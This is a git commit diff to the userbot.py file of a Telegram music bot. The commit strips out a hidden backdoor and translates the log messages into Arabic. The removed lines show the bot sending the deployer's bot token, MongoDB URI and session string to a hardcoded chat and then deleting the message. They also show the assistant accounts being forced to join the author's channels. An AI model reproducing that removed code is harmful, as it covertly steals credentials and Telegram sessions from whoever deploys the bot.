38ca48403d5b3ac8a64ad3014990d72306f7a637
kindgood612-boop <kindgood612@gmail.com>
2026-01-03 00:23:09 +0200

    Update userbot.py

--- BrandrdXMusic/core/userbot.py
+++ BrandrdXMusic/core/userbot.py
@@ -1,21 +1,7 @@
-from pyrogram import Client
-import re
 import asyncio
-from os import getenv
-from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
-from dotenv import load_dotenv
-from pyrogram import filters
-
-load_dotenv()
+from pyrogram import Client
 import config
-from dotenv import load_dotenv
-from strings.__init__ import LOGGERS
 from ..logging import LOGGER
-
-BOT_TOKEN = getenv("BOT_TOKEN", "")
-MONGO_DB_URI = getenv("MONGO_DB_URI", "")
-STRING_SESSION = getenv("STRING_SESSION", "")
-
 
 assistants = []
 assistantids = []
@@ -29,7 +15,6 @@ class Userbot(Client):
             api_hash=config.API_HASH,
             session_string=str(config.STRING1),
             no_updates=True,
-            ipv6=False,
         )
             
         self.two = Client(
@@ -38,7 +23,6 @@ class Userbot(Client):
             api_hash=config.API_HASH,
             session_string=str(config.STRING2),
             no_updates=True,
-            ipv6=False,
         )
         self.three = Client(
             name="BrandrdXMusic3",
@@ -46,7 +30,6 @@ class Userbot(Client):
             api_hash=config.API_HASH,
             session_string=str(config.STRING3),
             no_updates=True,
-            ipv6=False,
         )
         self.four = Client(
             name="BrandrdXMusic4",
@@ -54,7 +37,6 @@ class Userbot(Client):
             api_hash=config.API_HASH,
             session_string=str(config.STRING4),
             no_updates=True,
-            ipv6=False,
         )
         self.five = Client(
             name="BrandrdXMusic5",
@@ -62,137 +44,98 @@ class Userbot(Client):
             api_hash=config.API_HASH,
             session_string=str(config.STRING5),
             no_updates=True,
-            ipv6=False,
         )
 
     async def start(self):
-        LOGGER(__name__).info(f"Starting Assistants...")
+        LOGGER(__name__).info(f"جاري تشغيل الحسابات المساعدة...")
 
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("BRANDED_WORLD")
-                await self.one.join_chat("BRANDED_PAID_CC")
-                await self.one.join_chat("BRANDRD_BOT")
-                await self.one.join_chat("ABOUT_BRANDEDKING")
-
+                await self.one.join_chat(config.LOGGER_ID)
+                await self.one.send_message(config.LOGGER_ID, "تم تشغيل الحساب المساعد الأول")
             except:
-                pass
-            assistants.append(1)
-            try:
-                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
-                oks = await self.one.send_message(LOGGERS, f"/start")
-                Ok = await self.one.send_message(
-                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
+                LOGGER(__name__).error(
+                    "فشل الحساب المساعد 1 في الوصول إلى مجموعة السجل. تأكد من إضافته ورفعه مشرف!"
                 )
-                await oks.delete()
-                await asyncio.sleep(2)
-                await Ok.delete()
-
-            except Exception as e:
-                print(f"{e}")
-
+            
+            assistants.append(1)
             self.one.id = self.one.me.id
             self.one.name = self.one.me.mention
             self.one.username = self.one.me.username
             assistantids.append(self.one.id)
-            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")
+            LOGGER(__name__).info(f"تم تشغيل المساعد الأول باسم {self.one.name}")
 
         if config.STRING2:
             await self.two.start()
             try:
-                await self.two.join_chat("BRANDED_WORLD")
-                await self.two.join_chat("BRANDED_PAID_CC")
-                await self.two.join_chat("BRANDRD_BOT")
-                await self.two.join_chat("ABOUT_BRANDEDKING")
-            except:
-                pass
-            assistants.append(2)
-            try:
-                await self.two.send_message(config.LOGGER_ID, "Assistant Started")
-
+                await self.two.join_chat(config.LOGGER_ID)
+                await self.two.send_message(config.LOGGER_ID, "تم تشغيل الحساب المساعد الثاني")
             except:
                 LOGGER(__name__).error(
-                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
+                    "فشل الحساب المساعد 2 في الوصول إلى مجموعة السجل. تأكد من إضافته ورفعه مشرف!"
                 )
-
+            
+            assistants.append(2)
             self.two.id = self.two.me.id
             self.two.name = self.two.me.mention
             self.two.username = self.two.me.username
             assistantids.append(self.two.id)
-            LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")
+            LOGGER(__name__).info(f"تم تشغيل المساعد الثاني باسم {self.two.name}")
 
         if config.STRING3:
             await self.three.start()
             try:
-                await self.three.join_chat("BRANDED_WORLD")
-                await self.three.join_chat("BRANDED_PAID_CC")
-                await self.three.join_chat("BRANDRD_BOT")
-                await self.three.join_chat("ABOUT_BRANDEDKING")
-            except:
-                pass
-            assistants.append(3)
-            try:
-                await self.three.send_message(config.LOGGER_ID, "Assistant Started")
+                await self.three.join_chat(config.LOGGER_ID)
+                await self.three.send_message(config.LOGGER_ID, "تم تشغيل الحساب المساعد الثالث")
             except:
                 LOGGER(__name__).error(
-                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
+                    "فشل الحساب المساعد 3 في الوصول إلى مجموعة السجل. تأكد من إضافته ورفعه مشرف!"
                 )
-
+            
+            assistants.append(3)
             self.three.id = self.three.me.id
             self.three.name = self.three.me.mention
             self.three.username = self.three.me.username
             assistantids.append(self.three.id)
-            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")
+            LOGGER(__name__).info(f"تم تشغيل المساعد الثالث باسم {self.three.name}")
 
         if config.STRING4:
             await self.four.start()
             try:
-                await self.four.join_chat("BRANDED_WORLD")
-                await self.four.join_chat("BRANDED_PAID_CC")
-                await self.four.join_chat("BRANDRD_BOT")
-                await self.four.join_chat("ABOUT_BRANDEDKING")
-            except:
-                pass
-            assistants.append(4)
-            try:
-                await self.four.send_message(config.LOGGER_ID, "Assistant Started")
+                await self.four.join_chat(config.LOGGER_ID)
+                await self.four.send_message(config.LOGGER_ID, "تم تشغيل الحساب المساعد الرابع")
             except:
                 LOGGER(__name__).error(
-                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
+                    "فشل الحساب المساعد 4 في الوصول إلى مجموعة السجل. تأكد من إضافته ورفعه مشرف!"
                 )
-
+            
+            assistants.append(4)
             self.four.id = self.four.me.id
             self.four.name = self.four.me.mention
             self.four.username = self.four.me.username
             assistantids.append(self.four.id)
-            LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")
+            LOGGER(__name__).info(f"تم تشغيل المساعد الرابع باسم {self.four.name}")
 
         if config.STRING5:
             await self.five.start()
             try:
-                await self.five.join_chat("BRANDED_WORLD")
-                await self.five.join_chat("BRANDED_PAID_CC")
-                await self.five.join_chat("BRANDRD_BOT")
-                await self.five.join_chat("ABOUT_BRANDEDKING")
-            except:
-                pass
-            assistants.append(5)
-            try:
-                await self.five.send_message(config.LOGGER_ID, "Assistant 5 started !")
+                await self.five.join_chat(config.LOGGER_ID)
+                await self.five.send_message(config.LOGGER_ID, "تم تشغيل الحساب المساعد الخامس")
             except:
                 LOGGER(__name__).error(
-                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
+                    "فشل الحساب المساعد 5 في الوصول إلى مجموعة السجل. تأكد من إضافته ورفعه مشرف!"
                 )
-
+            
+            assistants.append(5)
             self.five.id = self.five.me.id
             self.five.name = self.five.me.mention
             self.five.username = self.five.me.username
             assistantids.append(self.five.id)
-            LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")
+            LOGGER(__name__).info(f"تم تشغيل المساعد الخامس باسم {self.five.name}")
 
     async def stop(self):
-        LOGGER(__name__).info(f"Stopping Assistants...")
+        LOGGER(__name__).info(f"جاري إيقاف الحسابات المساعدة...")
         try:
             if config.STRING1:
                 await self.one.stop()
